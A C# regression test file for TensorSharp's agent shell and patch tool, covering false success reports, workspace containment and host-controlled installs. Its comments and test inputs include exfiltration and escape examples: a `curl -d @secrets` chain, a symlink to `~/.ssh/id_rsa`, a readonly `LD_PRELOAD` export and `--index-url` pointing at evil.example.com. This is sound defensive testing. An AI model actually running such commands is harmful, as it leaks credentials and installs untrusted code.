// Copyright (c) Zhongkai Fu. All rights reserved.
// https://github.com/zhongkaifu/TensorSharp
//
// This file is part of TensorSharp.
//
// TensorSharp is licensed under the BSD-3-Clause license found in the LICENSE file in the root directory of this source tree.
//
// TensorSharp is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the BSD-3-Clause License for more details.

using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Threading;
using TensorSharp.AgentHost.CodeExec;
using TensorSharp.AgentHost.Skills;

namespace InferenceWeb.Tests;

/// <summary>
/// The defects an adversarial review of the shell rewrite found, each pinned by the
/// input that produced it.
///
/// <para>
/// They are collected here rather than scattered into the files that own each feature
/// because they share a shape worth seeing together: every one of them was a case where
/// the tool reported SUCCESS for something it had not done, or reported a constraint
/// that was not the real one. A shell tool that fails loudly costs a round; one that
/// says "applied the patch to 1 file" while deleting that file costs the task, and the
/// model has no way to find out.
/// </para>
/// </summary>
public class ShellRegressionTests : IDisposable
{
    private readonly string _base;
    private readonly SessionWorkspaceManager _manager;
    private readonly SessionWorkspace _workspace;
    private readonly ShellRunner _runner;

    public ShellRegressionTests()
    {
        _base = Path.Combine(Path.GetTempPath(), "ts-regress-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_base);
        _manager = new SessionWorkspaceManager(Path.Combine(_base, "sessions"));
        _workspace = _manager.GetOrCreate("s");
        _runner = new ShellRunner(new CodeExecOptions
        {
            Enabled = true,
            Sandbox = SkillSandboxMode.Off,
            ScratchDirectory = Path.Combine(_base, "scratch"),
            Timeout = TimeSpan.FromSeconds(30),
        });
    }

    public void Dispose()
    {
        _runner.Dispose();
        try { _manager.Release("s"); } catch { /* best effort */ }
        try { Directory.Delete(_base, recursive: true); } catch { /* best effort */ }
        GC.SuppressFinalize(this);
    }

    private static bool HaveShell =>
        ShellProgram.TryResolve(null, out ShellProgram? shell, out _) && shell is { Kind: ShellKind.Posix };

    private void Write(string name, string content) =>
        File.WriteAllText(Path.Combine(_workspace.WorkDirectory, name), content);

    private string Read(string name) =>
        File.ReadAllText(Path.Combine(_workspace.WorkDirectory, name));

    private CodeExecResult Patch(string body) =>
        _runner.ApplyPatch("*** Begin Patch\n" + body + "*** End Patch\n", _workspace);

    // ---- the patcher reported success for things it had not done -------------

    [Fact]
    public void AMoveToTheFilesOwnPath_LeavesTheFileWhereItIs()
    {
        // The commit wrote the new content to the destination and then deleted the
        // source. With both naming the same file that is a write followed by a delete of
        // what was just written — the file vanished, and the result said
        // "updated a.txt -> a.txt".
        Write("a.txt", "one\ntwo\n");

        CodeExecResult result = Patch("*** Update File: a.txt\n*** Move to: a.txt\n@@\n-one\n+ONE\n");

        Assert.True(result.Ok, result.Content);
        Assert.Equal("ONE\ntwo\n", Read("a.txt"));
        // And it must not claim a rename that did not happen.
        Assert.DoesNotContain("->", result.Content, StringComparison.Ordinal);
    }

    [Fact]
    public void TwoSectionsForTheSameFile_Compose_RatherThanTheLastOneWinning()
    {
        // Both sections used to resolve against the file as it was on DISK, so the second
        // one's write overwrote the first one's — while the result reported both applied.
        // Models emit this shape whenever two changes to one file are far apart.
        Write("a.txt", "one\ntwo\nthree\n");

        CodeExecResult result = Patch(
            "*** Update File: a.txt\n@@\n-one\n+ONE\n"
            + "*** Update File: a.txt\n@@\n-three\n+THREE\n");

        Assert.True(result.Ok, result.Content);
        Assert.Equal("ONE\ntwo\nTHREE\n", Read("a.txt"));
    }

    [Fact]
    public void DeleteThenAddOfTheSamePath_IsARewrite_NotARefusal()
    {
        // The Add was checked against the disk, where the file the Delete had just staged
        // still existed — so the model was told to "use Update instead" for a file it had
        // explicitly asked to replace wholesale.
        Write("a.txt", "old\n");

        CodeExecResult result = Patch("*** Delete File: a.txt\n*** Add File: a.txt\n+new\n");

        Assert.True(result.Ok, result.Content);
        Assert.Equal("new\n", Read("a.txt"));
    }

    [Fact]
    public void PatchingKeepsTheFilesEncoding()
    {
        // Round-tripping through ReadAllText/WriteAllText strips a UTF-8 BOM. That is a
        // whole-file change nobody asked for, invisible in the diff the model sees.
        string path = Path.Combine(_workspace.WorkDirectory, "b.txt");
        File.WriteAllBytes(path, new byte[] { 0xEF, 0xBB, 0xBF }
            .Concat(System.Text.Encoding.UTF8.GetBytes("one\ntwo\n")).ToArray());

        CodeExecResult result = Patch("*** Update File: b.txt\n@@\n-two\n+TWO\n");

        Assert.True(result.Ok, result.Content);
        byte[] after = File.ReadAllBytes(path);
        Assert.Equal(new byte[] { 0xEF, 0xBB, 0xBF }, after.Take(3));
    }

    [Fact]
    public void APathThatIsAbsoluteOnlyOnWindows_IsStillRefusedEverywhere()
    {
        // ':' alone is an ordinary POSIX filename character, so refusing "log:1.txt" was
        // wrong — but a drive-letter root is absolute wherever it is written, and
        // creating a file whose NAME contains backslashes instead is a stranger outcome
        // than refusing.
        CodeExecResult drive = Patch("*** Add File: C:\\temp\\x.txt\n+hello\n");
        Assert.False(drive.Ok);
        Assert.Contains("absolute", drive.Content, StringComparison.Ordinal);

        if (!OperatingSystem.IsWindows())
        {
            CodeExecResult colon = Patch("*** Add File: log:1.txt\n+hello\n");
            Assert.True(colon.Ok, colon.Content);
        }
    }

    // ---- containment the host performs on the model's behalf -----------------

    /// <summary>
    /// Whether this host lets an unprivileged process create a symbolic link at all.
    ///
    /// <para>
    /// Windows requires either Developer Mode or an elevated token for
    /// <c>CreateSymbolicLink</c>. Without one, the two tests below fail in their SETUP
    /// with "Administrator privilege required" - which looks exactly like the
    /// containment they check having regressed, while saying nothing whatever about it.
    /// Probed once, so a developer box without Developer Mode reports "not run" instead
    /// of "broken".
    /// </para>
    /// </summary>
    private static readonly Lazy<bool> CanCreateSymlinks = new(() =>
    {
        string probe = Path.Combine(Path.GetTempPath(), "ts-symlink-probe-" + Guid.NewGuid().ToString("N"));
        try
        {
            File.WriteAllText(probe + ".target", "x");
            File.CreateSymbolicLink(probe + ".link", probe + ".target");
            return true;
        }
        catch (Exception ex) when (ex is UnauthorizedAccessException or IOException or PlatformNotSupportedException)
        {
            return false;
        }
        finally
        {
            try { File.Delete(probe + ".link"); } catch (Exception) { }
            try { File.Delete(probe + ".target"); } catch (Exception) { }
        }
    });

    [Fact]
    public void ASymlinkOutOfTheWorkspace_IsNotFollowedByThePatcher()
    {
        if (!CanCreateSymlinks.Value) return;

        // The host process does this I/O and no sandbox confines it, so a lexical
        // containment check is not enough: `ln -s ~/.ssh/id_rsa notes.txt` is one
        // ordinary command, entirely permitted inside the workspace, and a patch of
        // "notes.txt" would then write through the link.
        string outside = Path.Combine(_base, "outside.txt");
        File.WriteAllText(outside, "untouched\n");
        string link = Path.Combine(_workspace.WorkDirectory, "esc");
        File.CreateSymbolicLink(link, outside);

        CodeExecResult result = Patch("*** Update File: esc\n@@\n+pwned\n");

        Assert.False(result.Ok);
        Assert.Contains("symbolic link", result.Content, StringComparison.Ordinal);
        Assert.Equal("untouched\n", File.ReadAllText(outside));
    }

    [Fact]
    public void ASymlinkOutOfTheWorkspace_IsNotOfferedAsAProducedFile()
    {
        if (!CanCreateSymlinks.Value) return;

        // The other half of the same hole: change-based capture enumerates the work
        // directory and copies what is new, which would have followed the link and handed
        // the user a download of whatever it pointed at.
        string outside = Path.Combine(_base, "secret.txt");
        File.WriteAllText(outside, "a private key\n");
        File.CreateSymbolicLink(Path.Combine(_workspace.WorkDirectory, "notes.txt"), outside);

        var store = new CodeArtifactStore(Path.Combine(_base, "artifacts"));
        System.Collections.Generic.IReadOnlyList<CodeArtifact> captured = store.Capture(
            "run", _workspace.WorkDirectory, (id, rel, _) => "/x/" + id + "/" + rel, out _);

        Assert.DoesNotContain(captured, a => a.Path == "notes.txt");
    }

    // ---- the shell surface ---------------------------------------------------

    [Fact]
    public void AnApplyPatchTheHostCannotAnswer_IsRefused_NotHalfRun()
    {
        if (!HaveShell) return;

        // There is no apply_patch binary in the sandbox. Handing this to the shell
        // produced "command not found" for that one word, ran `echo` afterwards, and
        // exited with the LAST command's status — so the model read `exit 0` and the
        // echo's output and concluded its edit had landed.
        Write("main.py", "x = 1\n");

        CodeExecResult result = _runner.Run(
            new ShellRequest("apply_patch <<'EOF'\n*** Begin Patch\n*** Update File: main.py\n@@\n-x = 1\n+x = 2\n*** End Patch\nEOF\necho done"),
            _workspace);

        Assert.False(result.Ok);
        Assert.Contains("apply_patch", result.Content, StringComparison.Ordinal);
        Assert.Equal("x = 1\n", Read("main.py"));   // untouched, and the model is told so
    }

    [Fact]
    public void AShellDiagnostic_NamesTheLineTheModelActuallyWrote()
    {
        if (!HaveShell) return;

        // The wrapper's own lines were counted one short, so every message bash produced
        // pointed at the line after the offending one. A model then reads the line below
        // its mistake and fixes the wrong thing.
        CodeExecResult result = _runner.Run(
            new ShellRequest("ts-no-such-command-xyz\necho second"), _workspace);

        Assert.Contains("command line 1:", result.Content, StringComparison.Ordinal);
    }

    [Fact]
    public void ACdOutOfTheWorkspace_DoesNotBecomeTheSessionsDirectory()
    {
        if (!HaveShell) return;

        // Reads outside the workspace are allowed, so `cd /usr` succeeds. Persisting it
        // left the shell somewhere the host's own containment check rejects, and the two
        // halves of this tool surface then disagreed about what a relative path meant.
        _runner.Run(new ShellRequest("cd / && pwd"), _workspace);
        CodeExecResult after = _runner.Run(new ShellRequest("pwd"), _workspace);

        // Since OutputPaths, the work directory prints as "." rather than as the host's
        // absolute path — so what witnesses "we are back in the work directory" is that
        // `pwd` says exactly that, and that the result carries no "Working directory is
        // now …" line, which Describe emits only when the shell is somewhere else.
        Assert.Contains("\n.\n", after.Content.Replace("\r", string.Empty), StringComparison.Ordinal);
        Assert.DoesNotContain("Working directory is now", after.Content);
        Assert.DoesNotContain(_workspace.Root, after.Content);
    }

    [Fact]
    public void AReadonlyExportOfAHostOwnedVariable_DoesNotPersist()
    {
        if (!HaveShell) return;

        // The save-side filter matched only "declare -x ". bash writes "declare -rx " for
        // a readonly export, so the two variables the filter exists for — PATH and
        // LD_PRELOAD — could be made to persist by declaring them readonly.
        _runner.Run(new ShellRequest("declare -rx LD_PRELOAD=/tmp/x.so; echo set"), _workspace);
        CodeExecResult after = _runner.Run(new ShellRequest("echo \"LD=[${LD_PRELOAD:-}]\""), _workspace);

        Assert.Contains("LD=[]", after.Content, StringComparison.Ordinal);
    }

    [Fact]
    public void AnEnvironmentValueWithANewline_LeavesTheValueWholeOrGone_NeverHalf()
    {
        if (!HaveShell) return;

        // Under sh/dash `export -p` emits a MULTI-LINE record for such a value; the
        // save-side line filter dropped only the line that matched (`PATH=b'`), and the
        // dangling quote left behind aborted every later command under sh and silently
        // swallowed the rest of the file under bash.
        //
        // What the shell does with that value is NOT the same on every POSIX host, which
        // is why this asserts the outcome rather than the repair: bash 4.4 and newer
        // write the whole value on ONE line, ANSI-C quoted as $'a\nPATH=b' (also under
        // --posix), so nothing is ever cut and nothing is ever reset there, while dash
        // and older bash take the multi-line path and the saved environment is thrown
        // away. Asserting "was reset" here therefore only passed on a POSIX host with no
        // modern bash: it failed on this repo's own Linux CI. The reset itself is pinned
        // deterministically by the next test.
        //
        // What must hold on EVERY host: the next command still runs, the value comes
        // back whole or not at all but never half, and the record's second line never
        // becomes PATH.
        _runner.Run(
            new ShellRequest("export NOTE=\"$(printf 'a\\nPATH=b')\"; echo ok"), _workspace);
        CodeExecResult after = _runner.Run(new ShellRequest(
            "echo still-working; n=\"${NOTE-MISSING}\"; "
            + "case \"$n\" in MISSING|\"\") echo NOTE=gone ;; a) echo NOTE=half ;; "
            + "*) if [ \"$n\" = \"$(printf 'a\\nPATH=b')\" ]; then echo NOTE=whole; "
            + "else echo NOTE=other; fi ;; esac; "
            + "case \"$PATH\" in b) echo PATH_B=yes ;; *) echo PATH_B=no ;; esac"), _workspace);

        Assert.True(after.Ok, after.Content);
        Assert.Contains("still-working", after.Content, StringComparison.Ordinal);
        // The half of the record that survives the filter is `PATH=b`, so a filter that
        // let it through would hand the next command a one-letter PATH.
        Assert.Contains("PATH_B=no", after.Content, StringComparison.Ordinal);
        // "NOTE=half" IS the original defect: the value cut at the newline.
        Assert.DoesNotContain("NOTE=half", after.Content, StringComparison.Ordinal);
        Assert.DoesNotContain("NOTE=other", after.Content, StringComparison.Ordinal);
        Assert.True(
            after.Content.Contains("NOTE=whole", StringComparison.Ordinal)
            || after.Content.Contains("NOTE=gone", StringComparison.Ordinal),
            after.Content);
    }

    [Fact]
    public void ACorruptSavedEnvironment_IsResetAndSaidOutLoud()
    {
        if (!HaveShell) return;

        // The repair path itself — the wrapper's trial source in a subshell — pinned
        // without depending on how THIS host's shell happens to quote a newline. The
        // seeded file is exactly what the sh/dash save-side filter used to leave behind:
        // a record cut in half, with a dangling quote. Sourcing that fails on bash and
        // on dash alike, so the reset fires on every POSIX host.
        //
        // Resetting silently would mean a variable the model exported two calls ago is
        // simply gone, with no way to tell that from having mistyped the name, so the
        // note is the contract here rather than an implementation detail.
        _runner.Run(new ShellRequest("export KEEP=1; echo ok"), _workspace);

        string envFile = _runner.SessionFor(_workspace).EnvironmentFilePath;
        Assert.True(File.Exists(envFile), envFile);
        string marker = envFile + ".reset";
        if (File.Exists(marker)) File.Delete(marker);
        File.WriteAllText(envFile, "export NOTE='a\n");

        CodeExecResult after = _runner.Run(new ShellRequest("echo still-working"), _workspace);

        Assert.True(after.Ok, after.Content);
        Assert.Contains("still-working", after.Content, StringComparison.Ordinal);
        Assert.Contains("was reset", after.Content, StringComparison.Ordinal);

        // Once, not on every later call: the unusable file is replaced, not left to fail
        // again. (The same command's EXIT trap rewrites it from a fresh `export -p`, so
        // there is nothing to assert about it being left empty.)
        CodeExecResult third = _runner.Run(new ShellRequest("echo again"), _workspace);
        Assert.DoesNotContain("was reset", third.Content, StringComparison.Ordinal);
    }

    [Fact]
    public void ASingleLineLargerThanTheCap_IsTruncated()
    {
        if (!HaveShell) return;

        // The drain loop only ever removes WHOLE lines and refuses to empty the queue, so
        // one enormous line was kept in full — `base64 -w0 x.bin` returned megabytes
        // through a 32 KB cap and into the model's context.
        var runner = new ShellRunner(new CodeExecOptions
        {
            Enabled = true,
            Sandbox = SkillSandboxMode.Off,
            ScratchDirectory = Path.Combine(_base, "scratch2"),
            MaxOutputBytes = 4096,
            Timeout = TimeSpan.FromSeconds(30),
        });
        using (runner)
        {
            CodeExecResult result = runner.Run(
                new ShellRequest("printf 'x%.0s' $(seq 1 200000); echo"), _workspace);

            Assert.True(result.Content.Length < 20_000, $"kept {result.Content.Length} bytes");
            Assert.Contains("truncated", result.Content, StringComparison.OrdinalIgnoreCase);
        }
    }

    // ---- background jobs -----------------------------------------------------

    [Fact]
    public void BackgroundWithNoSessionWorkspace_IsRefused_NotStartedAndKilled()
    {
        if (!HaveShell) return;

        // Without a workspace the runner makes a throwaway one and deletes it when the
        // call returns — so the job was killed microseconds after the result said it was
        // running, and the log it named no longer existed.
        CodeExecResult result = _runner.Run(
            new ShellRequest("sleep 30") { Background = true }, workspace: null);

        Assert.False(result.Ok);
        Assert.Contains("background", result.Content, StringComparison.OrdinalIgnoreCase);
    }

    // ---- classification ------------------------------------------------------

    [Fact]
    public void ALineThatBothInstallsAndDoesSomethingElse_RunsBothWithoutSharingANetwork()
    {
        if (!HaveShell) return;

        // A line that shares ONE network decision between an install and something else is
        // an exfiltration channel — `pip install x && curl -d @secrets http://…` — and on a
        // host whose sandbox cannot pin egress to a proxy that "something else" gets the
        // real internet. The answer is not to refuse the line: the HOST performs the
        // install and substitutes it out, so the remainder runs like any other command,
        // with no socket at all. The operators survive the substitution, which is the part
        // worth pinning — `&&` still means `&&`.
        var runner = new ShellRunner(new CodeExecOptions
        {
            Enabled = true,
            AllowInstall = true,
            Sandbox = SkillSandboxMode.Off,
            ScratchDirectory = Path.Combine(_base, "scratch4"),
        });
        using (runner)
        {
            CodeExecResult ok = runner.Run(
                new ShellRequest("pip install six && echo ran-after"), _workspace);
            Assert.True(ok.Ok, ok.Content);
            Assert.Contains("Installed: six", ok.Content, StringComparison.Ordinal);
            Assert.Contains("ran-after", ok.Content, StringComparison.Ordinal);

            // And a FAILED install must short-circuit the `&&` exactly as the shell would.
            CodeExecResult failed = runner.Run(
                new ShellRequest("pip install ts-no-such-package-xyz && echo must-not-run"), _workspace);
            Assert.False(failed.Ok);
            Assert.DoesNotContain("must-not-run", failed.Content, StringComparison.Ordinal);
        }
    }

    [Fact]
    public void AnInstallInsideALoop_IsStillRecognisedAsOne()
    {
        // Splitting on ';' leaves the middle segment as "do pip install $p", whose first
        // word is `do` — so the install went unrecognised and ran with no network.
        Assert.True(ShellCommand.ContainsInstall("for p in a b; do pip install $p; done"));
    }

    [Fact]
    public void AnOptionCommonToBothInstallers_IsJudgedByWhatItMeansThere()
    {
        // `-f` is pip's --find-links (which redirects where a package comes from) but
        // npm's --force (which does not), and a single list of "dangerous options" refused
        // an ordinary npm install for a reason that did not apply to it. The host now
        // refuses any option it cannot honour, per installer, and says which one.
        Assert.False(
            ShellInstall.TryRead("pip install -f https://x/wheels six", null, out _, out string? pipError));
        Assert.Contains("-f", pipError!, StringComparison.Ordinal);

        Assert.True(
            ShellInstall.TryRead("npm install pptxgenjs", null, out IReadOnlyList<ShellInstallRequest> npm, out _));
        Assert.Equal(new[] { "pptxgenjs" }, Assert.Single(npm).Packages);
    }

    // ---- options -------------------------------------------------------------

    [Fact]
    public void AnEnvironmentVariable_DoesNotOverrideTheFlagAnOperatorTyped()
    {
        // An environment variable is a default and a flag is a decision. Applying the
        // variable unconditionally silently discarded the operator's explicit choice on
        // the one setting that decides where an installer may connect.
        string? saved = Environment.GetEnvironmentVariable(CodeExecOptions.InstallDomainsEnvVar);
        try
        {
            Environment.SetEnvironmentVariable(CodeExecOptions.InstallDomainsEnvVar, "old.example.com");
            CodeExecOptions options = CodeExecOptions.Parse(
                new[] { "--code-exec-install-domains", "new.example.com" }, out _);
            options.ApplyEnvironment();

            Assert.Equal(new[] { "new.example.com" }, options.InstallDomains);
        }
        finally
        {
            Environment.SetEnvironmentVariable(CodeExecOptions.InstallDomainsEnvVar, saved);
        }
    }

    [Fact]
    public void AnOperatorTimeoutAboveTheCallCap_RaisesTheCapRatherThanContradictingIt()
    {
        // Otherwise the declaration reads "default 900000, maximum 600000", and a model
        // asking for its own stated default gets LESS than by saying nothing.
        var options = new CodeExecOptions { Timeout = TimeSpan.FromSeconds(900) };
        Assert.True(options.EffectiveMaxTimeout >= options.Timeout);

        // And a value beyond what a millisecond wait can express is clamped rather than
        // thrown out of the tool dispatch, which used to leave the child running.
        var huge = new CodeExecOptions { Timeout = TimeSpan.FromDays(60) };
        Assert.True(huge.EffectiveMaxTimeout.TotalMilliseconds < int.MaxValue);
    }

    // ---- installs are performed by the host, never by the model's command ------

    private ShellRunner InstallRunner(string scratch) => new(new CodeExecOptions
    {
        Enabled = true,
        AllowInstall = true,
        Sandbox = SkillSandboxMode.Off,
        ScratchDirectory = Path.Combine(_base, scratch),
        Timeout = TimeSpan.FromSeconds(120),
    });

    [Fact]
    public void AnOptionThatWouldChangeWhereAPackageComesFrom_IsRefused()
    {
        // The whole reason installs moved back to the host: the command line is written by
        // the model, so --index-url points the installer wherever it likes. Reading the
        // request instead of running it means the host builds the argument vector, and an
        // option it cannot honour is refused by name rather than ignored — ignoring it
        // would install something other than what was asked for and report success.
        using ShellRunner runner = InstallRunner("i1");

        CodeExecResult result = runner.Run(
            new ShellRequest("pip install --index-url https://evil.example.com/simple six"), _workspace);

        Assert.False(result.Ok);
        Assert.Contains("--index-url", result.Content, StringComparison.Ordinal);
        Assert.Contains("by name", result.Content, StringComparison.Ordinal);
    }

    [Fact]
    public void AnInstallerTheHostCannotPerform_SaysSo_RatherThanRunningWithANetwork()
    {
        // A program is not a library and no package manager here can supply one. Saying
        // that plainly is the difference between the model doing the step another way and
        // the model retrying the same line.
        using ShellRunner runner = InstallRunner("i2");

        CodeExecResult result = runner.Run(new ShellRequest("gem install nokogiri"), _workspace);

        Assert.False(result.Ok);
        Assert.Contains("gem", result.Content, StringComparison.Ordinal);
        Assert.Contains("pip", result.Content, StringComparison.Ordinal);
    }

    [Fact]
    public void ARequirementsFile_IsReadByTheHost_AndItsOptionsRefused()
    {
        // A requirements file is a list of NAMES, so the host can read it and validate each
        // line — that is still the host choosing what to install. An option inside it is
        // the same problem as an option on the command line.
        using ShellRunner runner = InstallRunner("i3");

        Write("bad-req.txt", "--index-url https://evil.example.com\nsix\n");
        CodeExecResult refused = runner.Run(new ShellRequest("pip install -r bad-req.txt"), _workspace);
        Assert.False(refused.Ok);
        Assert.Contains("--index-url", refused.Content, StringComparison.Ordinal);

        Write("missing-req.txt", "");
        CodeExecResult absent = runner.Run(new ShellRequest("pip install -r nope.txt"), _workspace);
        Assert.False(absent.Ok);
        Assert.Contains("nope.txt", absent.Content, StringComparison.Ordinal);
    }

    [Fact]
    public void TheAllowedPackageList_AppliesHoweverTheRequestIsSpelled()
    {
        // This flag was retired as unenforceable while the model's own command ran the
        // install, and came back when installs moved to the host. The point of the test is
        // the "however spelled" half: pip, python -m pip and a requirements file all reach
        // the same validated name list.
        using var runner = new ShellRunner(new CodeExecOptions
        {
            Enabled = true,
            AllowInstall = true,
            AllowedPackages = new[] { "six" },
            Sandbox = SkillSandboxMode.Off,
            ScratchDirectory = Path.Combine(_base, "i4"),
        });

        foreach (string spelling in new[]
                 {
                     "pip install requests",
                     "python3 -m pip install requests",
                     "pip3 install requests",
                 })
        {
            CodeExecResult result = runner.Run(new ShellRequest(spelling), _workspace);
            Assert.False(result.Ok, spelling);
            Assert.Contains("allowed-package list", result.Content, StringComparison.Ordinal);
        }
    }

    [Fact]
    public void ABackgroundedInstall_IsRefusedBeforeAnythingIsInstalled()
    {
        // Refused up front rather than after the fact, so the refusal leaves nothing
        // half-done for the model to reason about.
        using ShellRunner runner = InstallRunner("i5");

        CodeExecResult result = runner.Run(
            new ShellRequest("pip install six") { Background = true }, _workspace);

        Assert.False(result.Ok);
        Assert.Contains("background", result.Content, StringComparison.OrdinalIgnoreCase);
    }
}
